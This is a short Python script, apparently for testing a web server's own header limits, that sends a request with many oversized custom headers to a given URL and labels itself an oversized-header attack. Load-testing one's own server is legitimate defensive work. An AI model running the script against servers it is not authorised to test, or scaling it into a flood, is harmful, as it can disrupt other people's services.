import requests
import argparse

# Oversized Header Attack Script
# Sends requests with large headers to test MAX_HEADER_SIZE (8192) and MAX_REQUEST_HEADERS (50)
# Usage: python oversized_header.py --url http://<your-server-ip>/dashboard --header-count 60 --header-size 9000

def oversized_header_attack(url, header_count, header_size):
    try:
        headers = {f"X-Header-{i}": "A" * header_size for i in range(header_count)}
        response = requests.get(url, headers=headers, timeout=5)
        print(f"Sent request with {header_count} headers, Status: {response.status_code}")
    except requests.RequestException as e:
        print(f"Error sending request: {e}")

def main():
    parser = argparse.ArgumentParser(description="Oversized Header Attack Simulator")
    parser.add_argument("--url", required=True, help="Target URL (e.g., http://<your-server-ip>/dashboard)")
    parser.add_argument("--header-count", type=int, default=60, help="Number of headers")
    parser.add_argument("--header-size", type=int, default=9000, help="Size of each header")
    args = parser.parse_args()

    print(f"Starting Oversized Header attack on {args.url} with {args.header_count} headers of {args.header_size} bytes...")
    oversized_header_attack(args.url, args.header_count, args.header_size)
    print("Attack completed.")

if __name__ == "__main__":
    main()